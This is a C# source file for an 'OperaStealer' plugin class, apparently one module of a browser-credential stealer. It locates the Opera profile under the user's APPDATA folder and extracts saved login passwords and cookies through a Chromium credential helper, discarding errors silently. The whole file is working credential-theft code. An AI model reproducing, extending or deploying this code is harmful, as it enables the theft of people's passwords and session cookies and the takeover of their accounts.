using System;
using System.Collections.Generic;
using System.IO;

namespace Plugin.Browsers
{
    public class OperaStealer : BrowserBase
    {
        public OperaStealer()
        {
            browserName = "Opera";
            string appData = Environment.GetEnvironmentVariable("APPDATA");
            profilePath = Path.Combine(appData, "Opera Software", "Opera Stable");
        }
        
        public override List<SavedLogin> GetPasswords()
        {
            List<SavedLogin> logins = new List<SavedLogin>();
            
            if (!CheckBrowserInstalled())
                return logins;
            
            try
            {
                string loginDataPath = Path.Combine(profilePath, "Login Data");
                
                if (File.Exists(loginDataPath))
                {
                    // Opera uses Chromium-based structure
                    ChromiumCredentialManager chromiumManager = new ChromiumCredentialManager(
                        Path.Combine(Environment.GetEnvironmentVariable("APPDATA"), "Opera Software", "Opera Stable"));
                    
                    var chromiumLogins = chromiumManager.GetSavedLogins();
                    foreach (var login in chromiumLogins)
                    {
                        login.Browser = browserName;
                        logins.Add(login);
                    }
                }
            }
            catch { }
            
            return logins;
        }
        
        public override List<Cookie> GetCookies()
        {
            List<Cookie> cookies = new List<Cookie>();
            
            if (!CheckBrowserInstalled())
                return cookies;
            
            try
            {
                ChromiumCredentialManager chromiumManager = new ChromiumCredentialManager(
                    Path.Combine(Environment.GetEnvironmentVariable("APPDATA"), "Opera Software", "Opera Stable"));
                
                var hostCookies = chromiumManager.GetCookies();
                foreach (var hostCookie in hostCookies)
                {
                    cookies.AddRange(hostCookie.Cookies);
                }
            }
            catch { }
            
            return cookies;
        }
    }
}
